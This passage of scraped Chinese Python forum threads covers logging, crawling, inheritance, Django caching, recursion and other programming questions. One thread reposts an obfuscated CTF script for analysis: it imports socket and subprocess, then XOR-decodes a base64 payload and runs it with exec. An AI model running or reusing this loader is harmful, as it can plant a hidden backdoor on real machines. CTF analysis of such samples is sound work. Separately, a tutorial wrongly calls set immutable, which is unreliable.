只重定向输出，不会重定向错误信息。我的那个命令会将输出丢弃，但错误信息仍然会打印到我当前的终端上。我在本地时， run 是在 IDE 的 Terminal 中执行的，只要我 IDE 不关闭，这个会话其实一直都在运行。用`( ... &)`运行的命令是没有一个终端界面的， Django 中偶尔的错误信息和和 log 信息没有重定向也无法显示，会抛出到它的父终端来显示。当我关闭了 xshell 后，父会话结束了，这些输出没有任何人愿意认领，会堆积在输出缓存里，当输出缓存堆满，就被阻塞。 http 的结束符无法发送，前台浏览器就会阻塞。\r", "\r", "跑题了。回到主题\r", "不建议大量的 print 。在开发阶段，这些输出能够很好的帮助找到错误。但如果输出过多，则会干扰有用的信息。建议需要保留存档的使用专用的日志模块实现。调试则用 IDE 的 Debug run 。因为无论什么用途，都有比 print 更好的方案。", "我的第一印象也是 py 这种单线程优先的语言， print 绝对会影响性能的吧？", "print 多了是一定会的， print 使用的是字符设备, io 中最慢的一款。", "单论写效率问题，一个是标准输出 1 ，一个是写文件，如果缓冲方式一样，效率是差别不大的。之所以建议 logger 而不是 print ，应该是方便日志管理，设置日志输出级别，多线程日志输出同步，以及玩异步写什么的。", "不见得会有很大性能影响：\r", "1. 真要高性能用 C ，或者 C 模块，别欺负 Python\r", "2. 有 buffer ，而且写入 log 文件 buffer 比写终端要快，因为不是 linebuffer\r", "推荐用 logging 是因为：\r", "1. 不需要自己 format ，可以简单套模板\r", "2. logging 会以行为单位，一次性写入，或者用锁。如果不这样的话多线程的 log 可能会撕裂\r", "3. 尽管 logging 默认是写入文件，但是可以通过拓展 logger.emit()，轻松实现其他输出，比如输出到日志服务器。而 print 不可能扩展，也只能由外部程序捕捉输出文件再转发\r", "\r", "说那么多有的没的，怎么不去看看 CPython 源码呢？ ", "\r", "\r", " stdio is line buffered ，方便用户程序，这是 Linux 和很多操作系用的默认\r", "\r", " buffered IO 怎么会慢，进 buffer 就是一次 memory copy\r", "\r", " 那你用 logging 输出一下 2*999999 试试？\r", "\r", " 用终端跑后台本来就是不对。说实话，我怀疑你关了终端你的后端已经被杀掉了。正经用 mod_wsgi 或者 gunicorn 根本没这档子事。正规用 systemd ， systemd 会捕获所有输出，转给 journald\r", "\r", " GIL 不锁 IO\r", "\r", " print 会的话 logging 也会"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如优酷这种比较大的站点，只需要确定 url 都有就行</p>\n</div></div>", "<div class=\"topic_content\">自己想到了一点，如果拥有 url 消重的集合增长速度小于某个值了，也就是近似不增长了，那就认为基本抓全了，这样可行吗？</div>"], "reply": "5", "tittle": "全站抓取爬虫，如何确定抓全了一个站点？", "comment": ["如果是一个频繁更新的站点，你永远抓不全。", "这个怎么可能知道有没有抓全 除非你事先知道他全部的目录结构…", "没法确定。\r", "\r", "按道理说，优酷内部其实都不知道某一个时刻精确有多少视频。因为是分布式的。每个节点随时都在删除，新增。", "跟 google 检索量对比一下，判断抓取比例", "一个网页对应动态的 URL 的时候怎么办呢？\r", "你只能根据内容来计算啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码如下:</p>\n<pre><code>class Student(object):\n    def __init__(self,name,age,school):\n        self.__name = name\n        self.__age = age\n        self.__school = school\n\n    def toString(self):\n        print('我是%s,我%s 岁了,在%s 上学.' %(self.__name,self.__age,self.__school))\n\n\nclass XiaoMing(Student):\n    def __init__(self,name,age,school):\n        self.__name = name\n        self.__age = age\n        self.__school = school\n\n    ''' 覆写父类 toString()方法'''\n    # def toString(self):\n    #     print('我是%s,我%s 岁了,在%s 上学.' %(self.__name,self.__age,self.__school))\n</code></pre>\n<pre><code>''' 接受 Student 任何子类对象'''\ndef fun(stu):\n    stu.toString()\n\n###测试\nxm = XiaoMing('小明',25,'北大')\nfun(xm) \n\n</code></pre>\n<p>按照继承, <code>XiaoMing</code>继承自 <code>Student</code>, 且属性是一模一样的,则<code>toString</code>函数再写一遍是多余的, 道理讲,应该直接使用父类的 <code>toString</code>方法,就可以了, 但是我去掉<code>XiaoMing</code>的<code>toString</code>方法后,就找不到 自身实例的私有属性了, 因为 python 解释器将私有属性名改变了, 我就觉得在这里多态基本都是废的, 代码复用完全无效了,</p>\n<p>顺便问下大家, 继承/多态 在python中还有那些有用的地方?</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>经过各位大神的提示， 再翻阅了各个博客 官方文档  好像都是单下划线[_]标识 私有 ， 然后使用</p>\n<pre><code> super().__init__(name,age)\n</code></pre>\n<p>实现继承，个人觉得这里好别扭啊 ，python提供了 <code>__</code>限制访问，但是这种方式在继承上又支持一半， 真是好不爽啊， 虽然<code>__</code>也不安全，但是相比 <code>_</code> 感觉<code>_</code>就是赤身裸体站在别人面前。</p>\n<p>最终代码像这样:</p>\n<pre><code>class Person(object):\n    def __init__(self,name,age):\n        self._name = name\n        self._age = age\n\n    def toString(self):\n        print(self)\n        print('hello,%s,%s' %(self._name, self._age))\n\n\nclass Student(Person):\n    def __init__(self,name,age):\n        super().__init__(name,age)\n\n\ndef fun(p):\n    p.toString()\n\n\nstu = Student('学生1',23)\nfun(stu)  ## hello,学生1,23\n</code></pre>\n<p>强迫症犯了 ，这点好别扭啊 ！！！！！ 啊啊啊啊啊啊啊啊</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>再吐槽下python, 木有 <code>;</code> 木有 <code>{</code>  <code>}</code>  大爷的!!!!!  变量都不知道在哪里声明的  javasctipt 好歹还有一个 <code>var</code> <code>let</code> 大爷的～～～～～～～～</p>\n</div></div>"], "reply": "42", "tittle": "初学 Python ,学习到 Python 继承,觉得继承/多态在 Python 中基本是废的,麻烦大家帮我解惑, 非常感谢大家!下附疑惑代码", "comment": ["你这里为什么要重写一次 XiaoMing 的 __init__？\r", "\r", "如果你必须重写 __init__，还可以看下这个：\r", "  咦??可以不写这个构造方法吗？　我试试　我还不知道这个啊　　谢谢！！～　　我看看你给的链接", "class XiaoMing(Student):\r", "    def __init__(self,name,age,school):\r", "        Student.__init__(self, name, age, school)", "def __str__(self):\r", "        return '我是%s,我%s 岁了,在%s 上学.' %(self.__name,self.__age,self.__school)\r", "\r", "看代码 你 toString 也多余 一般都直接 __str__\r", "\r", "然后你 str(实例)或者 print 实例 看看呢", "  尝试了几次不知道怎么写　你能代码展示下吗？ 谢谢了", "楼主这是用父类的来访问子类的成员变量了。其他语言也不是这么继承的吧…子类需要调用父类的构造函数。", "  不行　还是提示　`AttributeError: 'XiaoMing' object has no attribute '_Student__name'`", " 满足你需求的话，直接给 class 写个 pass 就好了？", "class XiaoMing(Student):\r", "    def __init__(self,name,age,school):\r", "\t\tsuper().__init__(name,age,school)", "   恩恩　我这个只是用来测试的　　继承子类覆盖父类方法　　按照道理，子类没有父类有就可以了，一样可以调用的", "  这种我尝试过了　不行的", " 　 1#说不写构造 我就尝试了直接 pass  不行的, 我想的是, 子类如果要编写一个和父类一模一样的方法, 那子类应该就不用再重复编写了, 至于 self 应该在传递 xm 的时候就应该指向 xm 对象才对的 ,但是 根据错误提示 还是指向了 Student 对象了", "LZ 你的命名有问题，如果一般的私有变量用一个下划线，两个下划线的变量通过继承是无法被覆盖的\r", "\r", "用的 python2 吧， super(Student,self).__init__(name,age,school)。", "  但是使用单下滑下[_]就变成 public 了.", "   是 Python 3.6.0", "那 def __init__(self,name,age,school):\r", "        super().__init__(name, age, school)    这样写没问题啊。", " pip 和 virtualenv 的作者说： Never, ever use two leading underscores.This is annoying private. 所以这个就别管 PEP8 了，@kennethreitz 写的代码都是用单下划线。 Py3.5+ 后用 super().__init__(*args,**kwargs) 来做到多继承。还有.......toString()......我猜有 Java/Scala 背景？", "django 选手表示，多继承撑起了 class based view 的一片天……\r", "登录验证只需继承一个 LoginRequiredMixin ，需要表单的话再继承一下 FormMixin ，需要模板的话再继承一下 TemplateResponseMixin ，然后选择一个基本父类比如 View 、 ProcessFormView 即可完成一个 view 的编写。\r", "剩下的事就是写写这些父类必须的属性即可，代码量能压缩到最少。", " 嗯， Mixin 和 CBVS 是绝配啊，避免了引入多个 utils 函数的烦恼。但我用的最多的还是 FBVS ⊙﹏⊙b 。。。。。", " 单下划线也看做私有， Python 里面没有真正的私有，双下划线的属性一样有办法获取。", " 正解.\r", "\r", "我翻译一下:\r", "派生类构造时没有调用基类的构造函数,导致基类成员没有被创建,直接输出自然报错.", "   哈哈哈哈 是啊  java    我看 python 很多特性感觉都是 javascript 和 java 的结合体 那按照你说 意思 最根本的原因是我使用了双下划线导致属性私有不能继承，所以在 toString 方法中 self 指向不到动态传递的对象 xm 上，是这样的吧？但是我在父类中 toString 方法中打印了 self 确实是子类对象呢？", "  这个我了解， 但是 。。  可能我有强迫症  唉 算了 我以后就单下划线标识私有吧[_]", " 呃..什么..Python 里的 self 就等价于 Java 里的 this ，唯一不同的是 Java 已经在每个方法里把实例绑定了，不需要手动声明 this ，而 Python 的设计理念要求程序员手动把类里面方法的第一个参数显式(explicit is better than implicit 这种)声明(不用 self 而用 foo/bar/abc/def 等其他变量来声明也可以，只是 self 是约定俗成的一种表现方法)。", "  嗯嗯 这个我也测试过 是这样的   我个人觉得这是因为 python 动态语言特性导致的。  在 python 中，动态调用方法 其实是假象，只要方法签名相同，就能找到这个方法， 即使没有继承关系，就像 javasctipt 可以将一个函数随意的绑定到别的对象上。", "要记住， python 的世界全部是 public 。忘掉 java 就能写出来简洁的东西了。不然写出来的东西只能长成 java 的样子。", "自己把其他语言的惯性思维带到学 python 上，怪 python 咯", "对我来说， JavaScript 才是略奇怪的。", "  嗯嗯 记住了", "  是的 怪 python", "  javascript 不仅仅是奇怪呀", "不用再写一遍函数，可以用父类的函数的。", "如果你指的是传统语言的多态， python 是不支持的， python 支持的是鸭子类型，这可比多态强大多了。传统多态接受的对象必须是有相同的基类的，而 python 只要查找到对象支持某种相同的方法就可以调用。比如飞机对象有方法是“ fly()”，鸟也有相同的方法“ fly()”，你就可以写一个函数“ dofly(obj): obj.fly()”，同时接受飞机对象和鸟对象, 尽管它们不是同一个基类。", "看了代码，感觉楼主就是想一对一翻译一下 Java 的代码，尽管 oop 思想是一致的，但要做到 pythonic 还是要系统的按部就班的学习一下 python", "__init__ 不是构造方法，这个是初始方法\r", "\r", "__new__ 才是构造方法", "看到 toString()，莫名其妙的想到了 Scala...", "toString 的话可以重写 __str__ 。", "建议你在骂语言辣鸡的之前 好好学一下", "Python 的思路和 Java 完全不一样…另外楼主你的用法有问题", "道理很简单，因为你在子类里又声明了一套同名变量，而父类里试图打印的是父类里的变量。名可名非常名\r", "你怎么不在 C++里继承然后声明同名变量试试？ C++也辣鸡咯？", "  非常感谢!   我知道了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>配置</p>\n<p>基于文件的 backend 会将每个缓存值分别存储到各个文件中。</p>\n<p>配置 filesystem 缓存:</p>\n<p>BACKEND</p>\n<p>\"django.core.cache.backends.filebased.FileBasedCache\" //让系统知道我们要将我们的缓存缓存到文件系统中区域</p>\n<p>LOCATION //指定合适的文件夹目录，文件夹目录可以有“/”也可以没有，都将处理成正确的，这个是缓存的目录设置</p>\n<p>设置为合适的文件夹目录</p>\n<p>OPTIONS</p>\n<p>MAX_ENTRIS 默认 300</p>\n<p>CULL_FREQUENCY 默认 3 一般需要设置</p>\n<p>配置——示例一</p>\n<p>（对于 Linux 和 Unix 下，直接指定它的绝对路径）</p>\n<p>CACHES = {</p>\n<p>'default': {</p>\n<p>'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',</p>\n<p>'LOCATION': '/var/tmp/django_cache',</p>\n<p>}</p>\n<p>}</p>\n<p>配置——示例二</p>\n<p>（如果是 Windows ，则写成 Windows 的目录）</p>\n<p>CACHES = {</p>\n<p>'default': {</p>\n<p>'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',</p>\n<p>'LOCATION': 'c:/foo/bar',</p>\n<p>}</p>\n<p>}</p>\n<p>配置——注意</p>\n<p>1 ）目录的路径需要绝对路径， Filesystem 缓存会以 root 权限启动 （必须保证系统能够对缓存的目录有访问权限）</p>\n<p>2 ）目录路径结尾处的“/”可有可无</p>\n<p>3 ）确保目录存在，且 web 服务器的用户对该目录具有读写权限</p>\n<p></p>\n<p>原文链接： <a href=\"http://www.maiziedu.com/wiki/django/deploy/\" rel=\"nofollow\">http://www.maiziedu.com/wiki/django/deploy/</a></p>\n</div></div>"], "reply": "3", "tittle": "Django 中的 FileSystem 缓存配置", "comment": ["一旦使用了 Filesystemcache ，则会面临部署多台服务器的时候 cache 不一致的问题", " 还有这一说，能否解释一下。。学习 django 不久，我还以为所有 cache 在表现上只有快慢不同", " 多台服务器各有各的“本地文件系统”"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>更新完之后 tools 里面没有 python 工具，进入 installer 里面也没有 python 相关选项，是彻底拿掉了？？？还是我出 bug 了？有点坑啊</p>\n</div></div>"], "reply": "7", "tittle": "visual studio 2017 更新之后 Python 模块消失？", "comment": ["\r", "\r", "另外问下 vs 2017 稳定吗？", " 我基本只用 python 模块，还挺好的\r", "\r", "我查到 release note 发现确实被移除了：\r", "\r", "Removed the Data Science and Python Development workloads as some of the components weren ’ t meeting the release requirements, such as translation to non-English languages. They will be available soon as separate downloads. F# is still available in the .NET Desktop and .NET Web development workloads. Upgrading to current version will remove any previously installed Python and Data Science workloads/components.", "要习惯微软的放弃", "微软 TMD 有病\r", "\r", "VS2015 开始，默认不安装 C 、 C++编译器和 windows 开发库。白瞎了轮子哥一众人在知乎安利用 VS 学 C 、 C++\r", "\r", "你说这是微软最近要跟随时代发展拥抱开源吧，却又不支持 UTF-8 without BOM 这个开源界的默认编码格式。", "“ They will be available soon as separate downloads ”\r", "\r", "需要单独下载安装了！！", " 还是 will be ，不知道 how long", " 编译器拆分是避免别人骂微软搞捆绑，利用不正当手段挤压 GCC 的生存空间。"]},
{"content": ["<div class=\"topic_content\">一个 ctf 上抠出来的 python 代码，求大家解析，在第 5 行用到了乱七八糟的东东。不知何意。\r<br>另：这个 ctf 是来分析一个 pcab 包，来还原攻击行为，有没有兴趣的朋友加入，我找到了 2 个 flag ，感觉很有趣，有兴趣可 PM 我。\r<br>#!/usr/bin/env python\r<br>from itertools import cycle, izip\r<br>import base64, sys\r<br>import socket, subprocess, os, urllib\r<br>x = lambda a, b: ''.join(chr(ord(c)^ord(k)) for c,k in izip(base64.decodestring(a), cycle(b)))\r<br>c = \"\"\"\r<br>EBF9em9mAARICEAAW0doVwVWQWhGAUpsWVJSTjleXkFcQUMTQlxQXFZFHxNERlNDQVhQVEBAGxNe\r<br>QB8XRkNfX15ROzl7eGBlEw4XEQALCxkCBwUdBgUGHQIDAhM5Y3hhZRMOFwUHBQU9OUJbVltfEQ4T\r<br>W1JcUVdWCRERaBJAbBMXFxERFhNER0MbXEQdVlZHVERVGxoeOUkTDhdfUF5RU1IRVwkXERMdWVha\r<br>XxtoVFtDG1xFVxlLGhdtEQNLAVYYE1VYQRFLE15dEVduHjk7QBMKE0JcUFxWRR1AWFBaVkcfQF5Q\r<br>WFJHH3J1aHp/dmcbE0JcUFxWRR1geHB6bGBjYXRyfh45Qh1QWF1fVlBDGxl7fGRnHRNjeGFlGho9\r<br>QB9AVllXGUsbRFtUX18fGhgaOT1EWVpfUhNlQUZSCTsTExcTUl5XFw4RSxtEHUNWUEEbAAMBAxoY\r<br>ORMXExFBVkRGXUcTChMTETkXExETWlETUl5XFw4MExFGRlhHEQ0TU0FWVlg7ExMXE1RfWlETUl5X\r<br>GUBFUkFDQEZaR18bE1BXFxEYCTkXExETExcTEUdBTgk7ExMXExETExcTERMTWEAfUFtTWkMbUFpX\r<br>agAJaho7ExMXExETExdWSVBWR0cLORMXExETExcTERMTF0FUQEZbRxEOExV9XhNAQlBZE1VeX1QT\r<br>XEUTVVpBUlBFXEFOEm1dET0TERMTUl9YVRNUXlUdQENSQ0dAQFpFWxsVVFRHExUaCzkTFxMRExMX\r<br>E0VBSg05ERMTFxMRExMXExETRkVfXVpRGWZjf1xHVl9WQR8aH0FWQ0FYVkVSG1JeV2wHC24fF1xC\r<br>HUNWR1kdUVZAVF1SWlYZUF5TaAUJbh4aOxMTFxMRExMXVklQVkdHEXZLVFZBR1pYXRFSQBdWCzkT\r<br>FxMRExMXExETExdBVEBGW0cRDhNER0MbVh4TGhMRa10TORMXExFWX15VEVBeUx1CR1JFR0JEWkNb\r<br>GRFWT1ZSExEeCTsTExcTERMTF0RYR1sXXEFWXR8UVEtWVB1FS0cQHxEURBAaEVJAF1ULORMXExET\r<br>ExcTERMTF0BEUUNFXFJWQEQdUlJfWxtSXldsBgtuHxdARVdcQkcMVR8XQEVXVkVBDFUaPRMRExMX\r<br>ExETQVJARF9HFw4REXZPVlJGR1JXHxN8QkdBRkcXWl8TVk9WUh1HT0dtXRE9ExETE1JfQlYJPRMR\r<br>ExMXExETQ0VcUhMOF0BEUUNFXFJWQEQdYVxDUl0ZORMXExETExcTERMTFxMRExNUXlUfORcTERMT\r<br>FxMRExMXExETExdAWVZfWw5lQUZSHzsTExcTERMTFxMRExMXExETQENXXkZHCkBEUUNFXFJWQEQd\r<br>YXpjch87ExMXExETExcTERMTFxMRE0BDV1RBQQpARFFDRVxSVkBEHWF6Y3IfOxMTFxMRExMXExET\r<br>ExcTERNAQ1dYXQ5ERlNDQVhQVEBAGWN4Y3YeORETExcTERMTRVZCRl9DEwwTQ0VcUh1AQ1deRkcZ\r<br>QVRSVx8aERgTR0FeUB1ER1VWQUUdQ1ZSUxsYORMXExFAHURWX1cbTxtDVkBCX0UTGBdAWVZfWxsY\r<br>Gho9QB9QX1hAVBsaPQ==\r<br>\"\"\"\r<br>exec(x(c, sys.argv[1]))</div>"], "reply": "1", "tittle": "一个 ctf 上抠出来的 Python 代码，求大家解析", "comment": ["为何不用 markdown 规整一下，，，看着好费劲，顺便 pm 你的方式也没留啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>所谓递归其实就是函数本身调用函数，直到满足指定条件之后一层层退出函数， 例如</p>\n<p>从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？“从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？‘从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？……’”</p>\n<ul>\n<li>利用函数编写一个斐波那契数列</li>\n</ul>\n<p><code>0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233 ， 377 ， 610 ， 987 ， 1597 ， 2584 ， 4181 ， 6765 ， 10946 ， 17711 ， 28657 ， 46368</code></p>\n<blockquote>\n<p>斐波那契数列就是前面给两个数相加得到后面一个数，依次往后</p>\n</blockquote>\n<p>代码如下</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding: utf-8 _*_\n\ndef Counter(n1, n2):\n    if n1 &gt; 10000:  # 当要计算的值大于 10000 就退出\n        return\n    print(\"Counter ：\", n1)  # 输出当前计算到那个值了\n    n3 = n1 + n2  # 第一个值加上第一个值等于第三个值\n    Counter(n2, n3)  # 调用计数器函数，此时第一个值是调用函数传过来的最后一个值，而第二个值是计算出来的第三个值\n\n\nCounter(0, 1)  # 调用计数器函数\n</code></pre>\n<p>输出结果</p>\n<pre><code>/usr/bin/python3.5 /home/ansheng/Documents/PycharmProjects/blogcodes/斐波那契.py\nCounter ： 0\nCounter ： 1\nCounter ： 1\nCounter ： 2\nCounter ： 3\nCounter ： 5\nCounter ： 8\nCounter ： 13\nCounter ： 21\nCounter ： 34\nCounter ： 55\nCounter ： 89\nCounter ： 144\nCounter ： 233\nCounter ： 377\nCounter ： 610\nCounter ： 987\nCounter ： 1597\nCounter ： 2584\nCounter ： 4181\nCounter ： 6765\n\nProcess finished with exit code 0\n</code></pre>\n<ul>\n<li>利用递归获取斐波那契数列中的第 10 个数，并将该值返回给调用者</li>\n</ul>\n<p>代码：</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding: utf-8 _*_\n\ndef Counter(Index, Start, End):\n    print(\"第%d 次计算，第一个数字是%d ，第二个数字是%d\" % (Index, Start, End))\n    if Index == 10:  # 如果要计算的值是 10 就退出\n        return Start\n    N = Start + End  # N 等于第一个数加上第二个数\n    Number = Counter(Index + 1, End, N)  # 继续调用计数器函数， End 相当与传给函数的第一个数， N 是传给函数的第二个数\n    return Number\n\n\nresult = Counter(1, 0, 1)\nprint(\"得出的数字是：\", result)\n</code></pre>\n<p>输出结果</p>\n<pre><code>/usr/bin/python3.5 /home/ansheng/Documents/PycharmProjects/blogcodes/递归.py\n第 1 次计算，第一个数字是 0 ，第二个数字是 1\n第 2 次计算，第一个数字是 1 ，第二个数字是 1\n第 3 次计算，第一个数字是 1 ，第二个数字是 2\n第 4 次计算，第一个数字是 2 ，第二个数字是 3\n第 5 次计算，第一个数字是 3 ，第二个数字是 5\n第 6 次计算，第一个数字是 5 ，第二个数字是 8\n第 7 次计算，第一个数字是 8 ，第二个数字是 13\n第 8 次计算，第一个数字是 13 ，第二个数字是 21\n第 9 次计算，第一个数字是 21 ，第二个数字是 34\n第 10 次计算，第一个数字是 34 ，第二个数字是 55\n得出的数字是： 34\n\nProcess finished with exit code 0\n</code></pre>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way-recursion/\" rel=\"nofollow\">原文链接</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Python 全栈之路系列之递归", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如下，我希望将 \"\\100\\200\" 转换为 r\"\\100\\200\"，应该怎样做？</p>\n<pre><code>&gt;&gt;&gt; \"\\100\\200\"\n'@\\x80'\n&gt;&gt;&gt; r\"\\100\\200\"\n'\\\\100\\\\200'\n</code></pre>\n<p>这个问题是在处理文件目录字符串时遇到的。</p>\n</div></div>", "<div class=\"topic_content\">意思就是将 unicode string 转换为 raw string ，打印 \"\\n\\n\\n\" 本身而不是三个回车符。</div>"], "reply": "10", "tittle": "Python 如何将带转义的字符串转换为不带转义的字符串？", "comment": ["os.sep", "用 r\"\\100\\200\"难道不行，虽然打出来是两个杠。\r", "目录分隔 os.sep 是正解。", " \r", " \r", "感谢，不过以后遇到这种需要转换字符串的情况该怎么做呢？这是编码问题吗……", " \r", "这不是编码问题。每种语言都有这种\\转义的啊。\r", "python 应该就是加 r 代表不转义， C#用 @代表不转义。\r", "单代\"\\\"使用\"\\\\\"来表示。", "看不太懂例子，就是想把\\n 这个换行符，换成两个符合  \\  加上一个  n  的字符串？", "每个字符替换为 \\<oct>", " 是的，\"\\n\"打印出来是一个回车，需要转换为 raw string 打印\"\\n\"本身。", "a = '\\n\\n\\n'\r", "repr(a) -> \"'\\\\n\\\\n\\\\n'\"\r", "可以再考虑去掉引号\r", "_[1:-1]", " 自动化转换应该是不可能的，把\\n 拿来举例子, python2.7\r", "\r", "x = '\\n'\r", "\r", "实际上如果上面这个语句已经执行完，那么 x 实际上是一个长度为 1 的 str ，里面只有一个字节，是 0x0a ，也就是 10 ，如果要把它不转义打印出来，或者是存储到另外一个对象 y 里，那么我们也不能讲 y 里面就得存储\\n ，因为不转义的话，实际上应该是\\x0a ，这个\\x0a 到\\n 的过程是我们人类自己做的规定，如果你要把\\x0a 换为\\n ，要把\\x0d 换为\\r ，那就得有一个转换的表才行，而且这一整张表都得写出来: ", " ，这里没有考虑 unicode 的问题。\r", "\r", "好像说的复杂了，也就是说\\n, \\r, 要从 0x0a, 0x0d 转换过来，需要一张表，当然， ascii 里面定义的转义字符不多，可以写到程序里就可以了，然后\r", "\r", "for key, value in escape_table:\r", "     x.replace( key, value )\r", "\r", "即可。", " 看懂了，十分感谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>hi ，\n如题， 不知道这是不是 django 的特性？直接用 python 试了没这效果。</p>\n<pre><code>import datetime\ndef test(a, b=datetime.datetime.now()):\n    print a\n    print \"b %s\" %b\n    print \"c %s\" %datetime.datetime.now()\n\ntest(2)\n</code></pre>\n<p>输出结果 b 的值不会改变， c 的正常。</p>\n</div></div>"], "reply": "14", "tittle": "django views.py 中， datetime.datetime.now() 作为默认参数时值不会改变", "comment": ["In [1]: import datetime\r", "\r", "In [2]: def test(a, b=datetime.datetime.now()):\r", "   ...:         print a\r", "   ...:         print \"b %s\" %b\r", "   ...:         print \"c %s\" %datetime.datetime.now()\r", "   ...:\r", "\r", "\r", "In [3]: import time\r", "\r", "In [4]: for i in range(6):\r", "   ...:     time.sleep( 2)\r", "   ...:     test(i)\r", "   ...:\r", "0\r", "b 2017-02-06 11:53:42.707000\r", "c 2017-02-06 11:55:00.035000\r", "1\r", "b 2017-02-06 11:53:42.707000\r", "c 2017-02-06 11:55:02.039000\r", "2\r", "b 2017-02-06 11:53:42.707000\r", "c 2017-02-06 11:55:04.044000\r", "3\r", "b 2017-02-06 11:53:42.707000\r", "c 2017-02-06 11:55:06.049000", "  打开之后搜索“原因解释如下：”", "年前刚遇到这个问题，你把括号去掉就好了", "请使用：\r", "b=lambda: datetime.datetime.now()\r", "\r", "建议先把书看看好，基础概念弄清楚后可以节省很多时间", "默认参数的默认值何时被计算？", "def test(a, b=None)):\r", "  if b is None:\r", "    b = datetime.datetime.now() \r", "\r", "易懂的办法", " @", " @", " @", " @", " 谢谢各位，基础功也确实欠缺。", " lambda 原来是这么用的！学习了！", " 默认参数的默认值被计算的时间，是“运行该函数声明行”的时间", " 我在质问楼主谢谢", " 那你应该用感叹号啊", "话说这边使用 lambda 和直接传 b=datetime.datetime.now 一样吧", " 只是一种提示的语气了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python 表达式 <strong><code>i += x</code></strong> 与 <strong><code>i = i + x</code></strong> 等价吗？如果你的回答是 yes ，那么恭喜你正确了 50%，为什么说只对了一半呢？ 按照我们的一般理解它们俩是等价的，整数操作时两者没什么异同，但是对于列表操作，是不是也一样呢？先看下面两段代码：</p>\n<p>代码 1</p>\n<pre><code>&gt;&gt;&gt; l1 = range(3)\n&gt;&gt;&gt; l2 = l1\n&gt;&gt;&gt; l2 += [3]\n&gt;&gt;&gt; l1\n[0, 1, 2, 3]\n&gt;&gt;&gt; l2\n[0, 1, 2, 3]\n</code></pre>\n<p>代码 2</p>\n<pre><code>&gt;&gt;&gt; l1 = range(3)\n&gt;&gt;&gt; l2 = l1\n&gt;&gt;&gt; l2 = l2 + [3]\n&gt;&gt;&gt; l1\n[0, 1, 2]\n&gt;&gt;&gt; l2\n[0, 1, 2, 3]\n</code></pre>\n<p>代码 1 与代码 2 中的<code>l2</code>的值是一样的，但是<code>l1</code>的值却不一样，说明 <code>i += x</code> 与 <code>i = i + x</code> 是不等价的，那什么情况下等价，什么情况下不等价呢？</p>\n<p>弄清楚这个问题之前，首选得明白两个概念：可变对象（ mutable ）与不可变对象（ immutable ）。在 Python 中任何对象都有的三个通用属性：唯一标识、类型、值。</p>\n<p><strong>唯一标识</strong>：用于标识对象的在内存中唯一性，它在对象创建之后就不会再改变，函数 <code>id()</code>可以查看对象的唯一标识</p>\n<p><strong>类型</strong>：决定了该对象支持哪些操作，不同类型的对象支持的操作就不一样，比如列表可以有 length 属性，而整数没有。同样地对象的类型一旦确定了就不会再变，函数 <code>type()</code>可以返回对象的类型信息。</p>\n<p>对象的<strong>值</strong>与唯一标识不一样，并不是所有的对象的值都是一成不变的，有些对象的值可以通过某些操作发生改变，值可以变化的对象称之为<strong>可变对象（ mutable ）</strong>，值不能改变的对象称之为<strong>不可变对象（ immutable ）</strong></p>\n<h3>不可变对象（ immutable ）</h3>\n<p>对于不可变对象，值永远是刚开始创建时候的值，对该对象做的任何操作都会导致一个新的对象的创建。</p>\n<pre><code>&gt;&gt;&gt; a = 1\n&gt;&gt;&gt; id(a)\n32574568\n&gt;&gt;&gt; a += 1\n&gt;&gt;&gt; id(a)\n32574544\n</code></pre>\n<p>整数 “ 1 ” 是一个不可变对象，最初赋值的时候，<code>a</code> 指向的是整数对象 1 ，但对变量 a 执行 <code>+=</code> 操作后， a 指向另外一个整数对象 2 ，但对象 1 还是在那里没有发生任何变化，而 变量 a 已经指向了一个新的对象 2 ，常见的不可变对象有： int 、 tuple 、 set 、 str 。</p>\n<p><img alt=\"imutable.png\" src=\"https://foofish.net/images/imutable.png\"></p>\n<h3>可变对象（ mutable ）</h3>\n<p>可变对象的值可以通过某些操作动态的改变，比如列表对象，可以通过 append 方法不断地往列表中添加元素，该列表的值就在不断的处于变化中，一个可变对象赋值给两个变量时，他们共享同一个实例对象，指向相同的内存地址，对其中任何一个变量操作时，同时也会影响另外一个变量。</p>\n<pre><code>&gt;&gt;&gt; x = range(3)\n&gt;&gt;&gt; y = x\n\n&gt;&gt;&gt; id(x)\n139726103041232\n&gt;&gt;&gt; id(y)\n139726103041232\n\n&gt;&gt;&gt; x.append(3)\n&gt;&gt;&gt; x\n[0, 1, 2, 3]\n&gt;&gt;&gt; y\n[0, 1, 2, 3]\n\n&gt;&gt;&gt; id(x)\n139726103041232\n&gt;&gt;&gt; id(y)\n139726103041232\n</code></pre>\n<p><img alt=\"imutable1.png\" src=\"https://foofish.net/images/mutable1.png\"></p>\n<p>执行 append 操作后，对象的内存地址不会改变， x 、 y 依然指向的是原来同一个对象，只不过是他的值发生了变化而已。</p>\n<p><img alt=\"imutable2.png\" src=\"https://foofish.net/images/mutable2.png\"></p>\n<p>理解完可变对象与不可变对象后，回到问题本身，<code>+=</code> 与 <code>+</code>的区别在哪里呢？</p>\n<p><code>+=</code> 操作首先会尝试调用对象的 <code>__iadd__</code>方法，如果没有该方法，那么尝试调用<code>__add__</code>方法，先来看看这两个方法有什么区别</p>\n<h3>__add__ 和 __iadd__ 